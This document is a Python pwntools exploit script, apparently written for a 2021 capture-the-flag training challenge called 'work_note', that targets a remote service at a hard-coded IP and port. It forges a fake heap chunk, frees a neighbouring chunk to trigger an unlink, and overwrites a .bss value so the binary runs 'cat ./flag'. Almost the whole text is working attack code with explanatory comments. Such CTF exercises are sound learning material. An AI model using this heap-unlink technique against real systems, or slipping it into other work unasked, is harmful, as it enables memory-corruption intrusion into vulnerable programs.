'''
For 3th training of 2021, work_note
'''
from pwn import *

bin_path = "./work_note"
remote_ip = ["124.16.75.162", 31054]
#sh = process(bin_path)
sh = remote(remote_ip[0], remote_ip[1])

context.log_level = "debug"
#gdb.attach(sh, "b* main")
for i in range(7):
    sh.recvuntil("Input the length of your work note:")
    sh.send("16\n")
    sh.recvuntil("Input context of your work record:")
    sh.send("AAA\n")

sh.recvuntil("Do you need to edit your note? y/n\n")
sh.send("y\n")
sh.recvuntil("0.exit\n")
sh.send("1\n")

chunk_list = 0x6020E0
cur_chk = chunk_list + 0x8 # it seems like this value can't change
size_sz = 0x8

# edit(1), malloc size = 0x90 + 0x10 = 0xa0, so edit chunk1 to gen a fake chunk, the real size of chunk1 is 0xb0(0xa0 + pre_size(0x08) + size(0x08))
sh.recvuntil("input the note index to edit:\n")
sh.send("1\n") #edit(1)
sh.recvuntil("Input the content:\n")
payload = p64(0)+p64(0xa1)+p64(cur_chk-3*size_sz)+p64(cur_chk-2*size_sz)+ b"A"*0x80+p64(0xa0)+p64(0xb0) # 0xb0 represents the size of chunk2, 
                                                                                                        # and make the fake chunk is freed, if not, then it's 0xb1
sh.send(payload) 

# free(2), free the chunk2 to cause unlink, then chunk1's address changes to be cur_chk - 3*size_sz = 0x6020D0
sh.recvuntil("0.exit\n")
sh.send("2\n")
sh.recvuntil("input the note index to delete:\n")
sh.send("2\n") #free(2) unlink

# modify .bss data, if the value of 0x6020D4 > 0xA7, then "system(cat ./flag)" 
sh.recvuntil("0.exit\n")
sh.send("1\n")
sh.recvuntil("input the note index to edit:\n")
sh.send("1\n") # write data
sh.recvuntil("Input the content:\n")
payload2 = "\x00\x00\x00\x00\xa8\x00\x00\x00"
sh.send(payload2) #write '0xA8'
sh.recvuntil("0.exit\n")
sh.send("0\n")

sh.interactive()
